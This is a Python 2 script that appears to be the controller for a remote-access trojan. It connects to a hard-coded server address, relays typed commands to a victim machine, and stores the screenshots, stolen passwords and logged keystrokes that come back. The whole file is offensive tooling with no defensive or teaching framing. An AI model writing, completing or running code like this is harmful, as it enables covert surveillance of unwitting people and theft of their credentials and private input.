import socket
import sys
import signal
from PIL import Image
from StringIO import StringIO
import threading, time
from packet import Packet

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

def send(client):
    cmd = raw_input("Enter command: ")
    pkt = Packet()
    pkt.toIP = attackip
    pkt.state = cmd
    pkt.send(client)

def receive(s):
    base = "C:\Users\Matt\Desktop\\testfolder"
    while True:
        pkt = Packet()
        pkt.construct(s)
        t = time.time()
        if pkt.state == "100":
            print pkt.data
            global attackip
            attackip = pkt.data
        elif pkt.state == "143":
            path = base + "\screenshot." + str(t) + ".png"
            im = Image.open(StringIO(pkt.data))
            im.save("C:\Users\Matt\Desktop\\testpic.png",'png')
        elif pkt.state == "144":
            path = base + "\passwords." + str(t) + ".txt"
            f = open(path,"w")
            f.write(pkt.data)
            f.close()
        elif pkt.state == "145":
            path = base + "\keystrokes." + str(t) + ".txt"
            f = open(path,"w")
            f.write(pkt.data)
            f.close()
        else:
            print "don't know that one"

ip = '54.191.130.62'
port = 5720

TCP_IP = ip
TCP_PORT = port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

threading.Thread(target=receive,args=[s]).start()

attackip = ""

while 1:
    send(s)


